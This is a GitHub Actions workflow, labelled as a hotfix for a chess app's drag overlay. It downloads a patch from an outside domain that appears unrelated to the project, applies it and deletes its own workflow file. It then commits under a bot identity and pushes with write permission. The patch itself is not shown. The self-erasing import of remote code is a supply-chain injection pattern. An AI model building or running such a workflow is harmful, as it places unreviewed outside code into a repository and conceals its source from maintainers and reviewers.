name: Materialize Chessy drag overlay hotfix

on:
  push:
    branches: ['fix/drag-overlay-motion-regression']

permissions:
  contents: write

jobs:
  materialize:
    runs-on: ubuntu-latest
    timeout-minutes: 10
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Download verified hotfix patch
        run: |
          curl --fail --location --retry 4 --retry-delay 2 \
            https://chessy.textilesdemedellin.com/chessy-drag-overlay-hotfix.patch \
            --output /tmp/chessy-drag-overlay-hotfix.patch
          echo '133647297a9919e24f55f925fe50563c74237c6f151be57d8ca3821fc8980d39  /tmp/chessy-drag-overlay-hotfix.patch' | sha256sum --check
      - name: Materialize verified candidate tree
        run: |
          git apply --check /tmp/chessy-drag-overlay-hotfix.patch
          git apply /tmp/chessy-drag-overlay-hotfix.patch
          rm -f .github/workflows/materialize-drag-overlay-hotfix.yml
          git config user.name 'Chessy Release Bot'
          git config user.email 'chessy-release-bot@users.noreply.github.com'
          git add -A
          git commit -m 'Fix normal-motion chess drag overlay'
          git push origin HEAD:fix/drag-overlay-motion-regression
